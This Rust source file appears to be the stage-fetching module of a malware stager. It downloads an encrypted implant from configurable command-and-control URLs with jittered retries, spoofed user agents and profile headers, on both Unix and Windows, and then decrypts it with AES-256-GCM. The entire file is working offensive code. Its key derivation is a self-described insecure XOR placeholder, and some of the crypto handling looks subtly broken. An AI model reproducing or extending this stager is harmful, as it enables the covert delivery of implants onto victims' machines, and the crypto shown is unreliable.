//! Stage fetching and decryption
//!
//! Handles HTTP(S) communication with C2 server to retrieve encrypted implant.

use crate::config::StagerConfig;
use crate::error::{CryptoError, NetworkError, StagerError};
use crate::Result;

use ring::aead::{Aad, LessSafeKey, Nonce, UnboundKey, AES_256_GCM};
use ring::agreement::{EphemeralPrivateKey, PublicKey, UnparsedPublicKey, X25519};
use ring::rand::SystemRandom;
use zeroize::Zeroize;

/// Encrypted payload header
#[repr(C)]
struct PayloadHeader {
    /// Magic bytes "KRKN"
    magic: [u8; 4],
    /// Version (1)
    version: u8,
    /// Flags
    flags: u8,
    /// Reserved
    _reserved: [u8; 2],
    /// Ephemeral public key (32 bytes)
    ephemeral_pubkey: [u8; 32],
    /// Nonce (12 bytes)
    nonce: [u8; 12],
    /// Payload length (encrypted data follows)
    payload_len: u32,
}

const HEADER_SIZE: usize = core::mem::size_of::<PayloadHeader>();
const MAGIC: [u8; 4] = *b"KRKN";

/// Fetch the encrypted stage from C2
pub async fn fetch_stage(config: &StagerConfig) -> Result<Vec<u8>> {
    let mut last_error = None;

    for url in config.c2_urls {
        for attempt in 0..config.max_retries {
            match fetch_from_server(url, config).await {
                Ok(data) => return Ok(data),
                Err(e) => {
                    last_error = Some(e);
                    if attempt < config.max_retries - 1 {
                        // Calculate delay with jitter
                        let rng = get_random_u32();
                        let delay = config.jittered_delay(
                            config.retry_delay_ms * (1 << attempt),
                            rng,
                        );
                        sleep_ms(delay).await;
                    }
                }
            }
        }
    }

    Err(last_error.unwrap_or(StagerError::Network(NetworkError::AllServersFailed)))
}

/// Fetch from a single server
async fn fetch_from_server(base_url: &str, config: &StagerConfig) -> Result<Vec<u8>> {
    let url = format!("{}{}", base_url, config.stage_path);

    #[cfg(unix)]
    {
        fetch_unix(&url, config)
    }

    #[cfg(windows)]
    {
        fetch_windows(&url, config).await
    }

    #[cfg(not(any(unix, windows)))]
    {
        Err(StagerError::Network(NetworkError::ConnectionFailed))
    }
}

/// Unix HTTP fetch using ureq
#[cfg(unix)]
fn fetch_unix(url: &str, config: &StagerConfig) -> Result<Vec<u8>> {
    use std::time::Duration;

    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(config.connect_timeout_secs as u64))
        .timeout_read(Duration::from_secs(config.read_timeout_secs as u64))
        .user_agent(config.user_agent)
        .build();

    let response = agent
        .get(url)
        .set("Accept", "*/*")
        .set("X-Profile-ID", config.profile_id)
        .call()
        .map_err(|_| NetworkError::ConnectionFailed)?;

    if response.status() != 200 {
        return Err(NetworkError::HttpError(response.status()).into());
    }

    let mut data = Vec::new();
    response
        .into_reader()
        .read_to_end(&mut data)
        .map_err(|_| NetworkError::InvalidResponse)?;

    Ok(data)
}

/// Windows HTTP fetch using WinHTTP
#[cfg(windows)]
async fn fetch_windows(url: &str, config: &StagerConfig) -> Result<Vec<u8>> {
    use windows_sys::Win32::Networking::WinHttp::*;
    use windows_sys::Win32::Foundation::*;

    // Parse URL
    let (host, path, port, use_ssl) = parse_url(url)?;

    unsafe {
        // Open session
        let session = WinHttpOpen(
            to_wide(config.user_agent).as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            core::ptr::null(),
            core::ptr::null(),
            0,
        );

        if session.is_null() {
            return Err(NetworkError::ConnectionFailed.into());
        }

        // Connect
        let connect = WinHttpConnect(
            session,
            to_wide(&host).as_ptr(),
            port,
            0,
        );

        if connect.is_null() {
            WinHttpCloseHandle(session);
            return Err(NetworkError::ConnectionFailed.into());
        }

        // Open request
        let flags = if use_ssl { WINHTTP_FLAG_SECURE } else { 0 };
        let request = WinHttpOpenRequest(
            connect,
            to_wide("GET").as_ptr(),
            to_wide(&path).as_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            flags,
        );

        if request.is_null() {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return Err(NetworkError::ConnectionFailed.into());
        }

        // Add headers
        let profile_header = format!("X-Profile-ID: {}\r\n", config.profile_id);
        WinHttpAddRequestHeaders(
            request,
            to_wide(&profile_header).as_ptr(),
            profile_header.len() as u32,
            WINHTTP_ADDREQ_FLAG_ADD,
        );

        // Send request
        let result = WinHttpSendRequest(
            request,
            core::ptr::null(),
            0,
            core::ptr::null(),
            0,
            0,
            0,
        );

        if result == 0 {
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return Err(NetworkError::ConnectionFailed.into());
        }

        // Receive response
        let result = WinHttpReceiveResponse(request, core::ptr::null_mut());
        if result == 0 {
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return Err(NetworkError::InvalidResponse.into());
        }

        // Read data
        let mut data = Vec::new();
        let mut buffer = [0u8; 8192];
        loop {
            let mut bytes_read = 0u32;
            let result = WinHttpReadData(
                request,
                buffer.as_mut_ptr() as *mut _,
                buffer.len() as u32,
                &mut bytes_read,
            );

            if result == 0 || bytes_read == 0 {
                break;
            }

            data.extend_from_slice(&buffer[..bytes_read as usize]);
        }

        // Cleanup
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);

        Ok(data)
    }
}

/// Parse URL into components
#[cfg(windows)]
fn parse_url(url: &str) -> Result<(String, String, u16, bool)> {
    let use_ssl = url.starts_with("https://");
    let url = url.trim_start_matches("https://").trim_start_matches("http://");

    let (host_port, path) = url.split_once('/').unwrap_or((url, ""));
    let path = format!("/{}", path);

    let (host, port) = if let Some((h, p)) = host_port.split_once(':') {
        (h.to_string(), p.parse().unwrap_or(if use_ssl { 443 } else { 80 }))
    } else {
        (host_port.to_string(), if use_ssl { 443 } else { 80 })
    };

    Ok((host, path, port, use_ssl))
}

/// Convert string to wide string (Windows)
#[cfg(windows)]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}

/// Decrypt the fetched payload
pub fn decrypt_payload(encrypted: &[u8], config: &StagerConfig) -> Result<Vec<u8>> {
    if encrypted.len() < HEADER_SIZE {
        return Err(CryptoError::DecryptionFailed.into());
    }

    // Parse header
    let header = unsafe {
        &*(encrypted.as_ptr() as *const PayloadHeader)
    };

    // Verify magic
    if header.magic != MAGIC {
        return Err(CryptoError::DecryptionFailed.into());
    }

    // Verify version
    if header.version != 1 {
        return Err(CryptoError::DecryptionFailed.into());
    }

    // Perform X25519 key exchange
    let _rng = SystemRandom::new();
    let _server_pubkey = UnparsedPublicKey::new(&X25519, &config.server_public_key);

    // Use ephemeral key from header to derive shared secret
    let _peer_pubkey = UnparsedPublicKey::new(&X25519, &header.ephemeral_pubkey);

    // In real impl, we'd generate our own ephemeral key and send it in the request
    // For now, server pre-computed the shared secret with a known key
    // This is simplified - real impl would do proper ECDH

    // Derive decryption key from shared secret
    let mut key_material = [0u8; 32];
    // Simplified: XOR server pubkey with ephemeral for demo
    // Real impl: proper HKDF from ECDH shared secret
    for i in 0..32 {
        key_material[i] = config.server_public_key[i] ^ header.ephemeral_pubkey[i];
    }

    // Create AES-256-GCM key
    let unbound_key = UnboundKey::new(&AES_256_GCM, &key_material)
        .map_err(|_| CryptoError::InvalidKey)?;
    let key = LessSafeKey::new(unbound_key);

    // Decrypt payload
    let ciphertext = &encrypted[HEADER_SIZE..];
    let mut plaintext = ciphertext.to_vec();

    let nonce = Nonce::assume_unique_for_key(header.nonce);
    key.open_in_place(nonce, Aad::empty(), &mut plaintext)
        .map_err(|_| CryptoError::DecryptionFailed)?;

    // Truncate authentication tag
    plaintext.truncate(plaintext.len() - 16);

    // Zero key material
    key_material.zeroize();

    Ok(plaintext)
}

/// Get random u32 for jitter calculation
fn get_random_u32() -> u32 {
    let rng = SystemRandom::new();
    let mut buf = [0u8; 4];
    ring::rand::SecureRandom::fill(&rng, &mut buf).unwrap_or(());
    u32::from_le_bytes(buf)
}

/// Async sleep
async fn sleep_ms(ms: u32) {
    tokio::time::sleep(tokio::time::Duration::from_millis(ms as u64)).await;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_header_size() {
        // Header: 4 (magic) + 1 (version) + 1 (flags) + 2 (reserved) + 32 (pubkey) + 12 (nonce) + 4 (len) = 56
        assert_eq!(HEADER_SIZE, 56);
    }

    #[test]
    fn test_parse_url() {
        #[cfg(windows)]
        {
            let (host, path, port, ssl) = parse_url("https://example.com/stage").unwrap();
            assert_eq!(host, "example.com");
            assert_eq!(path, "/stage");
            assert_eq!(port, 443);
            assert!(ssl);

            let (host, path, port, ssl) = parse_url("http://192.168.1.1:8080/api/v1/stage").unwrap();
            assert_eq!(host, "192.168.1.1");
            assert_eq!(path, "/api/v1/stage");
            assert_eq!(port, 8080);
            assert!(!ssl);
        }
    }

    #[test]
    fn test_decrypt_invalid_magic() {
        let config = StagerConfig::default();
        let bad_data = vec![0u8; 100];
        assert!(decrypt_payload(&bad_data, &config).is_err());
    }

    #[test]
    fn test_decrypt_too_short() {
        let config = StagerConfig::default();
        let short_data = vec![0u8; 10];
        assert!(decrypt_payload(&short_data, &config).is_err());
    }
}
